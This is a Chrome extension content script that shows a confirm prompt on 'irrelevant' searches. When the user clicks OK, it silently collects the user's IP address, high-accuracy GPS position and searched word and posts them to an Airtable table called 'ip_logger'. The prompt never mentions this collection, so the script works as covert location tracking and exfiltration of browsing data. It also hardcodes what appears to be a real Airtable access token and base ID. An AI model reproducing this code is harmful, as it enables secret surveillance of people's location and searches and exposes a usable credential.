let ip_address;
let userLocation;
let initialUrl = "https://www.google.com"; // Default fallback URL
let word = "N/A"; // Default searched word
let toggle = 0; // Initialize toggle

// Airtable API details
const API_KEY = 'patvAOxoSd15KysIK.57cee6fb3fea6a06e73f3da81bf868c02624cc2f02af4ac12edec436aafe10bc';
const BASE_ID = 'app6NIjzMgElahvq8';
const TABLE_NAME = 'ip_logger';

//  Step 1: Fetch `initialUrl` and `word` from background.js
chrome.runtime.sendMessage({ action: "getData" }, (response) => {
    if (response && response.initialUrl) {
        initialUrl = response.initialUrl;
        word = response.word;
        console.log(" Got Initial URL:", initialUrl);
        console.log(" Got searched word:", word);
    } else {
        console.error(" Failed to get data from background.js. Redirecting...");
        window.location.href = initialUrl;
        return;
    }

    //  Now show confirmation alert
    processUserChoice();
});

//  Step 2: Handle user confirmation
function processUserChoice() {
    let userChoice = confirm('Irrelevant search detected. Do you wish to continue?');

    if (userChoice) {
        toggle = 1;
        console.log(" User clicked OK, setting toggle:", toggle);

        // Notify background.js to update toggle
        chrome.runtime.sendMessage({ action: "updateToggle", toggle });

        //  Fetch IP & GPS location before redirecting
        fetchIpAddress()
            .then(ipData => {
                ip_address = ipData;
                console.log(" IP Address:", ip_address);
                return getGPSLocation();
            })
            .then(gpsLocation => {
                userLocation = gpsLocation;
                console.log(" GPS-based Location:", userLocation);
            })
            .catch(error => {
                console.warn("⚠ GPS failed, falling back to IP-based location:", error);
                return fetchUserLocation(ip_address);
            })
            .then(ipLocation => {
                if (!userLocation) userLocation = ipLocation;
                console.log(" Final Location Used:", userLocation);

                //  Write to Airtable with delay before redirecting
                return writeToAirtable(userLocation, ip_address, initialUrl, word);
            })
            .then(() => {
                console.log(" Waiting 1 second before redirection to ensure Airtable writes...");
                setTimeout(() => {
                    console.log(" Redirecting now...");
                    window.location.href = initialUrl;
                }, 1000); // 1 second delay before redirecting
            })
            .catch(error => {
                console.error(' Error occurred:', error);
                window.location.href = initialUrl;
            });

    } else {
        console.log(" User clicked Cancel. Redirecting to Google...");
        chrome.runtime.sendMessage({ action: "updateToggle", toggle });
        window.location.href = "https://www.google.com";
    }
}

//--------------------------------------------------------------------------

//  Function to write data to Airtable (Waits before redirecting)
async function writeToAirtable(location, ip, initialUrl, word) {
    const url = `https://api.airtable.com/v0/${BASE_ID}/${TABLE_NAME}`;
    const record = {
        records: [
            {
                fields: {
                    ip: ip || "N/A",
                    locationData: location || "N/A",
                    timeStamp: getIndianTimeStamp(),
                    searched_word: word || "N/A"
                }
            }
        ]
    };

    try {
        console.log(" Sending data to Airtable...");
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                Authorization: `Bearer ${API_KEY}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(record)
        });

        const responseBody = await response.json();

        if (response.ok) {
            console.log(' Successfully written to Airtable:', responseBody);
        } else {
            console.error(' Airtable API Error:', response.status, responseBody);
        }
    } catch (error) {
        console.error(' Fetch Error while writing to Airtable:', error);
    }
}

//  Function to fetch GPS-based user location (High Accuracy)
function getGPSLocation() {
    return new Promise((resolve, reject) => {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    if (accuracy > 1000) {
                        reject(" Low GPS accuracy detected (likely Wi-Fi/IP location).");
                    } else {
                        resolve(`Lat: ${latitude}, Lon: ${longitude}`);
                    }
                },
                (error) => {
                    reject(error.message);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        } else {
            reject(" Geolocation not supported.");
        }
    });
}

//  Function to fetch IP address
async function fetchIpAddress() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error(' Error fetching IP address:', error);
        return "Unknown IP";
    }
}

//  Function to fetch user location using IP (fallback)
async function fetchUserLocation(ip) {
    const url = `http://ip-api.com/json/${ip}`;

    try {
        const response = await fetch(url);
        const data = await response.json();

        if (response.ok && data.status === 'success') {
            return `${data.city}, ${data.regionName}, ${data.country}, Lat: ${data.lat}, Lon: ${data.lon},${data.as}`;
        } else {
            console.error(' Error fetching IP-based location:', data.message || 'Unknown error');
            return "Location not found";
        }
    } catch (error) {
        console.error(' Error fetching IP-based location:', error);
        return "Location not found";
    }
}

//  Function to get Indian timestamp
function getIndianTimeStamp() {
    const date = new Date();
    return new Intl.DateTimeFormat('en-IN', {
        timeZone: 'Asia/Kolkata',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    }).format(date);
}
